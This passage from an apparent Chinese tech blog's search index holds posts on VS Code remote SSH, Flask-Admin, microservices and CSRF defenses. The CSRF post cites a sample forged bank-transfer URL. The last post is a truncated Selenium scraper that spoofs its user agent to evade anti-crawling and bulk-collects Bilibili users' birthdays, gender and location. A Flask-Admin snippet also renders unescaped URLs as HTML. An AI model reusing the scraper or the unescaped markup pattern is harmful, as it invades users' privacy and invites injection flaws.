<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>带宽</tag>
        <tag>流量</tag>
        <tag>cdn</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode remote远程开发详解，mac、windows配置vscode remote远程开发</title>
    <url>/2019/06/24/vscode-remote/</url>
    <content><![CDATA[<p>vscode remote远程开发详解，mac、windows配置vscode remote远程开发<br><a id="more"></a></p>
<h1 id="什么是远程开发？"><a href="#什么是远程开发？" class="headerlink" title="什么是远程开发？"></a>什么是远程开发？</h1><p>其实用过pycharm的同学早就体验过了，就是远程链接我们的服务器，以服务器的环境去开发我们的项目，本地只是一个界面的显示，类似于xshell这种工具，但是对于开发工具来说，他又包含了很多方便我们开发的特性<br>目前，VSCode 远程开发支持下列三种主要模式：</p>
<p>Remote SSH：通过 SSH 连接到 Linux 服务器；<br>Remote Container：连接到 Docker 容器；<br>Remote WSL：连接到已安装的 WSL 环境。</p>
<h1 id="如何使用vscode的远程开发"><a href="#如何使用vscode的远程开发" class="headerlink" title="如何使用vscode的远程开发"></a>如何使用vscode的远程开发</h1><h2 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h2><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p><img src="https://shuhari.dev/media/blog/2019/06/vscode-remote-extension.png" alt></p>
<p>安装 remote-ssh这个插件 ，针对我们的服务器的，通过ssh链接</p>
<p>安装好了之后，侧边栏会出现一个电脑图标</p>
<h3 id="配置ssh密钥"><a href="#配置ssh密钥" class="headerlink" title="配置ssh密钥"></a>配置ssh密钥</h3><p>点击这个图标，然后配置ssh<br>如果你有的话，填写好配置之后，上传密钥就可以了<br>如果没有的话，先生成再上传就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Read more about SSH config files: https://linux.die.net/man/5/ssh_config</span><br><span class="line"># Host alias</span><br><span class="line">#    HostName hostname</span><br><span class="line">#    User user</span><br><span class="line"></span><br><span class="line">Host test-server # 链接名</span><br><span class="line">    HostName &lt;192.168.207.130&gt; # ip地址</span><br><span class="line">    User &lt;user&gt; # 用户名</span><br></pre></td></tr></table></figure>
<h3 id="生成ssh密钥和上传密钥"><a href="#生成ssh密钥和上传密钥" class="headerlink" title="生成ssh密钥和上传密钥"></a>生成ssh密钥和上传密钥</h3><ol>
<li>要为远程主机设置基于SSH密钥的身份验证：</li>
</ol>
<p>检查本地计算机上是否已有SSH密钥。公钥通常位于~/.ssh/id_rsa.pubmacOS / Linux和%USERPROFILE%.ssh\id_rsa.pubWindows上。</p>
<p>如果您没有密钥，请在本地终端/命令提示符下运行以下命令以生成SSH密钥对：</p>
<p>ssh-keygen -t rsa -b 4096<br>提示：没有ssh-keygen？安装支持的SSH客户端。</p>
<ol start="2">
<li>将本地公钥（id_rsa.pub文件）的内容添加到SSH主机authorized_keys上的相应文件中。</li>
</ol>
<p>在macOS / Linux上，在本地终端中运行以下命令，根据需要替换用户名和主机名。</p>
<p>ssh-copy-id your-user-name-on-host@host-fqdn-or-ip-goes-here</p>
<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>其实都一样，不一样地方是密钥的位置不一样<br>其他的配置都是一样的</p>
<p><img src="https://shuhari.dev/media/blog/2019/06/vscode-remote-side-view.png" alt></p>
<h1 id="连接使用"><a href="#连接使用" class="headerlink" title="连接使用"></a>连接使用</h1><p>配置好了之后，我们点击我们起的名称的图标就可以连接使用了，打开文件的是服务器上的文件了<br><img src="https://shuhari.dev/media/blog/2019/06/vscode-remote-open-folder.png" alt></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/23/vscode-4/">vscode windows 常用快捷键</a></li><li><a href="https://thelighter.github.io/2020/04/23/vscode-3/">vscode mac 必会快捷键</a></li><li><a href="https://thelighter.github.io/2020/04/16/vscode-2/">如何高效优雅使用vscode ？看完效率提升十倍！</a></li><li><a href="https://thelighter.github.io/2020/04/16/vscode-1/">vscode远程连接F12无法定义跳转和定义查看的问题解决</a></li></ul></div>]]></content>
      <categories>
        <category>vscode</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>serverless和FaaS到底是什么？</title>
    <url>/2019/06/23/serverless/</url>
    <content><![CDATA[<p>serverless构架和FaaS函数即服务<br><a id="more"></a></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>serverless构架</category>
      </categories>
      <tags>
        <tag>FaaS</tag>
      </tags>
  </entry>
  <entry>
    <title>flask-migrate如何修改env.py文件配置，可以识别出models中的String位数的变化</title>
    <url>/2019/06/23/flask-migrate/</url>
    <content><![CDATA[<p>Flask中，模型类字段的数据类型修改无法识别，compare_type=True<br><a id="more"></a><br>在env.py中修改<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">context.configure(connection=connection,</span><br><span class="line">                     target_metadata=target_metadata,</span><br><span class="line">                     compare_type=True,</span><br><span class="line">                     process_revision_directives=process_revision_directives,</span><br><span class="line">                     **current_app.extensions[&apos;migrate&apos;].configure_args,</span><br><span class="line">                     )</span><br></pre></td></tr></table></figure></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask-migrate</tag>
      </tags>
  </entry>
  <entry>
    <title>csrf防御策略，如何防止跨域请求伪造？</title>
    <url>/2019/06/23/csrf/</url>
    <content><![CDATA[<p>csrf防御策略，如何防止跨域请求伪造？<br><a id="more"></a></p>
<h1 id="当前防御-CSRF-的几种策略"><a href="#当前防御-CSRF-的几种策略" class="headerlink" title="当前防御 CSRF 的几种策略"></a>当前防御 CSRF 的几种策略</h1><p>在业界目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。下面就分别对这三种策略进行详细介绍。</p>
<h2 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h2><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
<p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
<h2 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h2><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
<p>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="http://url?csrftoken=tokenvalue。" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 <input type="”hidden”" name="”csrftoken”" value="”tokenvalue”/">，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
<p>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
<h2 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h2><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p>
<p>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>csrf</category>
      </categories>
      <tags>
        <tag>csrf</tag>
      </tags>
  </entry>
  <entry>
    <title>微服务——现在最流行的服务框架</title>
    <url>/2019/06/23/microserver/</url>
    <content><![CDATA[<p>什么是微服务？<br>微服务架构是一种架构模式，它提倡将单一应用程序划分成一组小的服务，服务之间互相协调、互相配合。<br>系统中的各个微服务可被独立部署，各个微服务之间是松耦合。<br><a id="more"></a></p>
<h1 id="什么是微服务"><a href="#什么是微服务" class="headerlink" title="什么是微服务"></a>什么是微服务</h1><p>什么是微服务<br>微服务架构是一种架构模式，它提倡将单一应用程序划分成一组小的服务，服务之间互相协调、互相配合，为用户提供最终价值。<br>系统中的各个微服务可被独立部署，各个微服务之间是松耦合。</p>
<h1 id="微服务的特点"><a href="#微服务的特点" class="headerlink" title="微服务的特点"></a>微服务的特点</h1><ol>
<li>复杂度可控</li>
<li>独立部署</li>
<li>技术选型灵活</li>
<li>容错</li>
<li>扩展</li>
</ol>
<h1 id="主流的解决方案"><a href="#主流的解决方案" class="headerlink" title="主流的解决方案"></a>主流的解决方案</h1><ul>
<li>Dubbo</li>
<li>SpringCloud</li>
</ul>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>微服务</category>
      </categories>
      <tags>
        <tag>框架</tag>
      </tags>
  </entry>
  <entry>
    <title>java一键安装所有环境，vscode做到了！</title>
    <url>/2019/06/16/java-1/</url>
    <content><![CDATA[<p>vscode一键安装所有java环境<br><a id="more"></a></p>
<h1 id="下载插件地址"><a href="#下载插件地址" class="headerlink" title="下载插件地址"></a>下载插件地址</h1><p><a href="http://aka.ms/vscode-java-installer-win" target="_blank" rel="noopener">http://aka.ms/vscode-java-installer-win</a>  </p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>flask-admin如何给用户分配权限</title>
    <url>/2019/06/11/flask-admin-4/</url>
    <content><![CDATA[<p>flask-admin给用户分配不同的权限<br><a id="more"></a></p>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有时我们需要给不同用户赋予不用的权限，这里我们用的是flask-admin</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>首先我们给flask的admin表新加字段role<br>然后我们判定当前用户也就是current_user的role是什么<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_accessible</span><span class="params">(self)</span>:</span></span><br><span class="line">      <span class="keyword">return</span> current_user.role==<span class="string">'admin'</span></span><br></pre></td></tr></table></figure></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/06/09/flask-admin-3/">flask-admin上传图片到服务器</a></li><li><a href="https://thelighter.github.io/2019/06/04/flask-admin-2/">flask-admin后台如何显示图片</a></li><li><a href="https://thelighter.github.io/2019/05/25/flask-admin-1/">flask-admin如何自己添加一个具有功能的按钮，Flask-Admin 增加自定义Action</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask-admin</tag>
      </tags>
  </entry>
  <entry>
    <title>flask中文文档和英文文档</title>
    <url>/2019/06/09/flask-1/</url>
    <content><![CDATA[<p>flask的中英文文档<br><a id="more"></a></p>
<h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p>flask最为web界和python界的最有魅力的框架，在GitHub中也是名列前茅，超过了django的star数，所以学好flask对我们的今后发展极为重要。下面给大家带来中英文的文档地址，方便我们去学习。</p>
<h1 id="中文文档"><a href="#中文文档" class="headerlink" title="中文文档"></a>中文文档</h1><p><a href="http://docs.jinkan.org/docs/flask/index.html" target="_blank" rel="noopener"></a></p>
<h1 id="英文文档"><a href="#英文文档" class="headerlink" title="英文文档"></a>英文文档</h1><p><a href="http://flask.pocoo.org/docs/1.0/" target="_blank" rel="noopener"></a></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flaks文档</tag>
      </tags>
  </entry>
  <entry>
    <title>flask-admin上传图片到服务器</title>
    <url>/2019/06/09/flask-admin-3/</url>
    <content><![CDATA[<p>flask-admin上传图片到服务器<br><a id="more"></a></p>
<blockquote>
<p>有时我们需要从后台传图片到服务器，而不是前端，对于使用flask和flask-admin的同学，这里有更好的办法可以让我们<br>轻松的上传图片</p>
</blockquote>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os.path <span class="keyword">as</span> op</span><br><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Markup</span><br><span class="line"><span class="keyword">from</span> flask_admin <span class="keyword">import</span> form </span><br><span class="line"><span class="keyword">from</span> flask_admin.form.upload <span class="keyword">import</span> ImageUploadField </span><br><span class="line"></span><br><span class="line">file_path = op.join(op.dirname(__file__), <span class="string">'../static'</span>) <span class="comment"># 文件上传路径</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">YourAdmin</span><span class="params">(BaseModelview)</span>:</span></span><br><span class="line">    </span><br><span class="line">    form_extra_fields = &#123;</span><br><span class="line">        <span class="string">'img'</span>: form.ImageUploadField(<span class="string">'Image'</span>,</span><br><span class="line">                                     base_path=file_path,     <span class="comment"># 保存路径</span></span><br><span class="line">                                     relative_path=<span class="string">'uploadFile/'</span>, <span class="comment"># static中的路径</span></span><br><span class="line">                                     thumbnail_size=(<span class="number">60</span>, <span class="number">60</span>, <span class="keyword">True</span>)) <span class="comment"># 大小限制</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://segmentfault.com/img/bV2076?w=554&amp;h=206" alt></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/06/11/flask-admin-4/">flask-admin如何给用户分配权限</a></li><li><a href="https://thelighter.github.io/2019/06/04/flask-admin-2/">flask-admin后台如何显示图片</a></li><li><a href="https://thelighter.github.io/2019/05/25/flask-admin-1/">flask-admin如何自己添加一个具有功能的按钮，Flask-Admin 增加自定义Action</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask-admin</tag>
      </tags>
  </entry>
  <entry>
    <title>flask-admin后台如何显示图片</title>
    <url>/2019/06/04/flask-admin-2/</url>
    <content><![CDATA[<p>flask-admin中在后台显示图片<br><a id="more"></a></p>
<h1 id="显示图片"><a href="#显示图片" class="headerlink" title="显示图片"></a>显示图片</h1><p>有时我们需要在flask的后台中显示出图片，但是数据库中保存的字符或者url不能自动的转化成图片<br>下面给大家介绍一种方法，可以自动的将图片显示出来</p>
<h1 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h1><p>首先我们需要安装好flask-admin，然后再后台的views.py中这样写<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from jinja2 import Markup</span><br><span class="line">def _avatar(self, context, model, name):</span><br><span class="line">    return Markup(&apos;&lt;img src=&quot;%s&quot; alt=&quot;&quot; style=&quot;width: 50px; height: 50px&quot;&gt;&apos; % (model.url))</span><br><span class="line"></span><br><span class="line">这里先定义一个方法用Markup标记，model.url是你的图片路径，model指的是你的数据库名称</span><br><span class="line"></span><br><span class="line">在ModelView中重写，加上</span><br><span class="line">column_formatters = &#123; &apos;url&apos;: _avatar&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="在这里我们的图片就可以正常显示了！"><a href="#在这里我们的图片就可以正常显示了！" class="headerlink" title="在这里我们的图片就可以正常显示了！"></a>在这里我们的图片就可以正常显示了！</h1><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/06/11/flask-admin-4/">flask-admin如何给用户分配权限</a></li><li><a href="https://thelighter.github.io/2019/06/09/flask-admin-3/">flask-admin上传图片到服务器</a></li><li><a href="https://thelighter.github.io/2019/05/25/flask-admin-1/">flask-admin如何自己添加一个具有功能的按钮，Flask-Admin 增加自定义Action</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask-admin</tag>
      </tags>
  </entry>
  <entry>
    <title>google web驱动下载，selenium谷歌驱动下载</title>
    <url>/2019/05/26/python-google-driver/</url>
    <content><![CDATA[<p>google web驱动下载，selenium谷歌驱动下载<br><a id="more"></a></p>
<p>下载地址 ：  <a href="https://sites.google.com/a/chromium.org/chromedriver/capabilities" target="_blank" rel="noopener">谷歌web驱动</a></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/05/26/python-selenium-1/">使用selenium多进程爬虫，bilibili爬虫</a></li></ul></div>]]></content>
      <categories>
        <category>selenium</category>
      </categories>
      <tags>
        <tag>selenium</tag>
      </tags>
  </entry>
  <entry>
    <title>使用selenium多进程爬虫，bilibili爬虫</title>
    <url>/2019/05/26/python-selenium-1/</url>
    <content><![CDATA[<p>使用selenium实现bilibili多进程爬虫<br><a id="more"></a></p>
<h1 id="利用多进程爬取哔哩哔哩的数据"><a href="#利用多进程爬取哔哩哔哩的数据" class="headerlink" title="利用多进程爬取哔哩哔哩的数据"></a>利用多进程爬取哔哩哔哩的数据</h1><p>#代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 注意修改无头浏览器的地址，该装的库要装</span><br><span class="line"># 数据将会写入EXCEL文件里，所以.csv文件请提前准备好</span><br><span class="line"></span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line">from selenium.webdriver.support.ui import WebDriverWait</span><br><span class="line">from selenium.webdriver.support import expected_conditions as EC</span><br><span class="line">from selenium.common.exceptions import TimeoutException</span><br><span class="line">import csv</span><br><span class="line">from multiprocessing import Pool</span><br><span class="line">import os, time</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"># 子进程，主要代码都写在这里</span><br><span class="line">def scrawler_process(process_start, num, sum, pace):</span><br><span class="line">    print(&apos;Run task %s (%s)...&apos; % (num, os.getpid()))</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    # 修改请求头，反爬虫</span><br><span class="line">    dcap = dict(DesiredCapabilities.PHANTOMJS)</span><br><span class="line">    dcap[&quot;phantomjs.page.settings.userAgent&quot;] = (</span><br><span class="line">        &quot;Mozilla/5.0 (Linux; Android 5.1.1; Nexus 6 Build/LYZ28E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.23 Mobile Safari/537.36&quot;</span><br><span class="line">    )</span><br><span class="line">    service_args = []</span><br><span class="line">    # 关闭图片加载有蜜汁BUG</span><br><span class="line">    #service_args.append(&apos;--load-images=no&apos;)  ##关闭图片加载</span><br><span class="line">    service_args.append(&apos;--disk-cache=yes&apos;)  ##开启缓存</span><br><span class="line">    service_args.append(&apos;--ignore-ssl-errors=true&apos;)  ##忽略https错误</span><br><span class="line">    phantom_path = &apos;phantomjs\\bin\\phantomjs.exe&apos;</span><br><span class="line">    driver = webdriver.PhantomJS(executable_path=phantom_path, service_args=service_args)</span><br><span class="line"></span><br><span class="line">   #已爬取的有效数据量</span><br><span class="line">    counter = 0</span><br><span class="line">    #urlNumber</span><br><span class="line">    urlNumber = process_start + num</span><br><span class="line">    #爬取连续失败的次数</span><br><span class="line">    fail_num = 0</span><br><span class="line"></span><br><span class="line">    #写入的EXCEL文件名</span><br><span class="line">    filename = &apos;bilibili-%d.csv&apos; % (num)</span><br><span class="line">    out = open(filename, &quot;a&quot;, newline=&quot;&quot;, encoding=&quot;utf-8&quot;)</span><br><span class="line">    csv_writer = csv.writer(out, dialect=&quot;excel&quot;)</span><br><span class="line"></span><br><span class="line">    while (counter &lt; sum and urlNumber &lt; 272500000):</span><br><span class="line">        # 随机选取uid</span><br><span class="line">        url = &quot;https://space.bilibili.com/%d#/dynamic&quot; % (urlNumber + random.randint(-1249, +1249))  # 要爬取的地址</span><br><span class="line">        driver.get(url)</span><br><span class="line">        print(url)</span><br><span class="line">        # bsObj = BeautifulSoup(driver.page_source)</span><br><span class="line">        # print(bsObj.prettify())</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            #判定网页是否加载完全</span><br><span class="line">            element = WebDriverWait(driver, 2).until(</span><br><span class="line">                EC.presence_of_element_located((By.CLASS_NAME, &quot;content&quot;)))</span><br><span class="line">            span = driver.find_element_by_id(&quot;h-name&quot;)</span><br><span class="line"></span><br><span class="line">            #获取性别的元素并处理</span><br><span class="line">            sexSpanClass = driver.find_element_by_id(&quot;h-gender&quot;).get_attribute(&quot;class&quot;).split(&quot; &quot;)</span><br><span class="line">            if len(sexSpanClass) == 3:</span><br><span class="line">                sex = sexSpanClass[2]</span><br><span class="line">            else:</span><br><span class="line">                sex = &quot;未填写&quot;</span><br><span class="line"></span><br><span class="line">            # 获取等级的元素并处理</span><br><span class="line">            level = driver.find_element_by_css_selector(</span><br><span class="line">                &quot;#space-body &gt; div.h &gt; div.wrapper &gt; div.h-inner &gt; div.h-user &gt; div &gt; div.h-basic &gt; div:nth-child(1) &gt; a.h-level.m-level&quot;).get_attribute(</span><br><span class="line">                &quot;lvl&quot;)</span><br><span class="line">            uid = urlNumber</span><br><span class="line"></span><br><span class="line">            # 获取注册时间的元素并处理</span><br><span class="line">            regtime = driver.find_element_by_class_name(&quot;regtime&quot;).find_element_by_class_name(&quot;text&quot;)</span><br><span class="line">            regtime_text = regtime.text</span><br><span class="line">            if (regtime_text == &apos;&apos;):</span><br><span class="line">                regtime_text = &quot;未填写&quot;</span><br><span class="line"></span><br><span class="line">            # 获取生日的元素并处理</span><br><span class="line">            birthday = driver.find_element_by_class_name(&quot;birthday&quot;).find_element_by_class_name(&quot;text&quot;)</span><br><span class="line">            birthday_text = birthday.text</span><br><span class="line">            if (birthday_text == &apos;&apos;):</span><br><span class="line">                birthday_text = &quot;未填写&quot;</span><br><span class="line"></span><br><span class="line">            # 获取地理位置的元素并处理</span><br><span class="line">            geo = driver.find_element_by_class_name(&quot;geo&quot;).find_element_by_class_name(&quot;text&quot;)</span><br><span class="line">            geo_text = geo.text</span><br><span class="line">            if (geo.text == &apos;&apos;):</span><br><span class="line">                geo_text = &quot;未填写&quot;</span><br><span class="line"></span><br><span class="line">            # 获取粉丝数的元素并处理</span><br><span class="line">            fan_num = driver.find_element_by_id(&quot;n-fs&quot;)</span><br><span class="line">            fan_num_text = fan_num.text</span><br><span class="line">            if (fan_num_text[-1] == &quot;万&quot;):</span><br><span class="line">                fan_num_text = 